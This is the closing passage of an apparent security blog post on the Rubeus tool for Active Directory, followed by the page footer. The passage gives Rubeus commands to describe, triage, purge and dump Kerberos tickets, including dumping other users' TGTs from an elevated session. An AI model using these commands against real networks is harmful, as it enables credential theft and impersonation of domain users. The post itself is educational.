+<p><img loading="lazy" src="https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEieNiT1NqlQJ6XX-v68CUP7L2r6GKfB7k4inUgNicpJfdwG25zZNJHQeekion5CN0asOuv8bdVDGlNLGfeoOqrmgfvdiK8Ws1Pya_9G56jX1XAN2M68-VRj8AmN6f30zGWpj-dSrTFKXcuysXB8X6wTrknGtv3gY8ug-tM2Dix9hE5ajlXBP58OudyvXg/s16000/27.png?w=640&amp;ssl=1" alt="https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEieNiT1NqlQJ6XX-v68CUP7L2r6GKfB7k4inUgNicpJfdwG25zZNJHQeekion5CN0asOuv8bdVDGlNLGfeoOqrmgfvdiK8Ws1Pya_9G56jX1XAN2M68-VRj8AmN6f30zGWpj-dSrTFKXcuysXB8X6wTrknGtv3gY8ug-tM2Dix9hE5ajlXBP58OudyvXg/s16000/27.png?w=640&amp;amp;ssl=1"  />
+</p>
+<p><strong>Describe</strong></p>
+<p>Often we lose track of the tickets in system. Describe option helps us to view details about a particular base64 encrypted blob or ticket.kirbi file.</p>
+<p>We can provide the ticket using /ticket flag.</p>
+<p><code>rubeus.exe describe /ticket:doIFNDCCBTCg...bA==</code></p>
+<p><img loading="lazy" src="https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh7WIoNU11b3w36Lw-C6yMzOBTFQxc7yc_-HXOlbJPfCnzdnN3paIj-5S8aSDB7zGWRHz-yeg3IiT1FTUhqgeN9xo6pJnO4fidzzgDOqGBbKNyv1j54uptRBvs2BFfWlJRmsqnM_Cy_kC7PuA9UysbRijcPorIUb3E4ZZrXLuVCfwCspDwVzBoUYAfF5A/s16000/28.png?w=640&amp;ssl=1" alt="https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh7WIoNU11b3w36Lw-C6yMzOBTFQxc7yc_-HXOlbJPfCnzdnN3paIj-5S8aSDB7zGWRHz-yeg3IiT1FTUhqgeN9xo6pJnO4fidzzgDOqGBbKNyv1j54uptRBvs2BFfWlJRmsqnM_Cy_kC7PuA9UysbRijcPorIUb3E4ZZrXLuVCfwCspDwVzBoUYAfF5A/s16000/28.png?w=640&amp;amp;ssl=1"  />
+</p>
+<p><strong>Triage</strong></p>
+<p>While klist views tickets for current session triage lists all the tickets. When a session is being run as an administrator, we can not only view tickets in the current user’s session memory but other user’s tickets in memory too.</p>
+<ul>
+<li>/luid: This flag can be used to provide a specific user ID.</li>
+</ul>
+<p><code>rubeus.exe triage</code>         <br>
+<code>rubeus.exe triage /luid:*0x8f57c*</code></p>
+<p><img loading="lazy" src="https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiY-eDU_fYg-Ta1R9oB54ePb_m9XufvCqw8HWY9J52F9-2dKB3zjQb7L50ZyXuk9GulLVXul-uPlDeDRfkGvUXiM0uJF8RRbb9ZGHrtGDW6TL6SqMvSpg9InazDv7SrjpG5DQsDeXGLNp6O4akhBrlu9qL714Z_mi-G6Db8knG2YgQICInIPR2oyb0T2w/s16000/29.png?w=640&amp;ssl=1" alt="https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiY-eDU_fYg-Ta1R9oB54ePb_m9XufvCqw8HWY9J52F9-2dKB3zjQb7L50ZyXuk9GulLVXul-uPlDeDRfkGvUXiM0uJF8RRbb9ZGHrtGDW6TL6SqMvSpg9InazDv7SrjpG5DQsDeXGLNp6O4akhBrlu9qL714Z_mi-G6Db8knG2YgQICInIPR2oyb0T2w/s16000/29.png?w=640&amp;amp;ssl=1"  />
+</p>
+<p>Also, when the LUID is known, we can purge particular user’s tickets too (elevated mode only)</p>
+<p><code>rubeus.exe purge /luid:*0x8f57c*</code></p>
+<p><img loading="lazy" src="https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiAKUAPB_XJDt6Tq5e8P6aR9obYD55fJBc83A0X11E6HQ-OPvfsuonWsT5MUVoB9GQYhCeaYRRP7tz1prxHmQ7v_DSUWpoCbBXozmfFwWxjNWQCJ8fEfw8cp6xhFXJWfqCAWcyixZ_Aajw4ArGdgMFj_tlqznpADDUFs4yY1RuQns1qfFU6IYmZO9WGTQ/s16000/30.png?w=640&amp;ssl=1" alt="https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiAKUAPB_XJDt6Tq5e8P6aR9obYD55fJBc83A0X11E6HQ-OPvfsuonWsT5MUVoB9GQYhCeaYRRP7tz1prxHmQ7v_DSUWpoCbBXozmfFwWxjNWQCJ8fEfw8cp6xhFXJWfqCAWcyixZ_Aajw4ArGdgMFj_tlqznpADDUFs4yY1RuQns1qfFU6IYmZO9WGTQ/s16000/30.png?w=640&amp;amp;ssl=1"  />
+</p>
+<p><strong>Dump</strong></p>
+<p>If the session is running in an elevated mode, a user can dump/ extract all the current TGTs and service tickets. Again, /luid can be provided to dump specific user’s tickets. /service can be used to filter these tickets.</p>
+<p>For example, /service:krbtgt displays only TGTs.</p>
+<p><code>rubeus.exe dump</code></p>
+<p><img loading="lazy" src="https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj0Wj1VAku1zDOX5hWi5X0sbmrJFZnXUu5eJQfHm8pXWCTHx0v62LUK30nibHWGq2RFDhFFCjXnSkccraTemLREKxKcd3gX42vNY7qdpwx7afNUL4907CfasdQo9jAFw5VbuXpPVovRHBzum8pdHBKJTj4spcRi2c66Or75V4gg9UwFXsWNzJYsU3BSsw/s16000/31.png?w=640&amp;ssl=1" alt="https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj0Wj1VAku1zDOX5hWi5X0sbmrJFZnXUu5eJQfHm8pXWCTHx0v62LUK30nibHWGq2RFDhFFCjXnSkccraTemLREKxKcd3gX42vNY7qdpwx7afNUL4907CfasdQo9jAFw5VbuXpPVovRHBzum8pdHBKJTj4spcRi2c66Or75V4gg9UwFXsWNzJYsU3BSsw/s16000/31.png?w=640&amp;amp;ssl=1"  />
+</p>
+<p>Next part I&rsquo;ll work on the mitigation bit as it&rsquo;s own unit hope you learnt a few bit on the read &hellip; 😊</p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="https://malw0re.github.io/tags/active-directory/">Active-Directory</a></li>
+    </ul>
+<nav class="paginav">
+  <a class="prev" href="https://malw0re.github.io/posts/active-directory/ad-credential-enumeration/">
+    <span class="title">« Prev</span>
+    <br>
+    <span>AD CRED ENUM</span>
+  </a>
+</nav>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+    <span>&copy; 2023 <a href="https://malw0re.github.io/">OUHBOY</a></span>
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
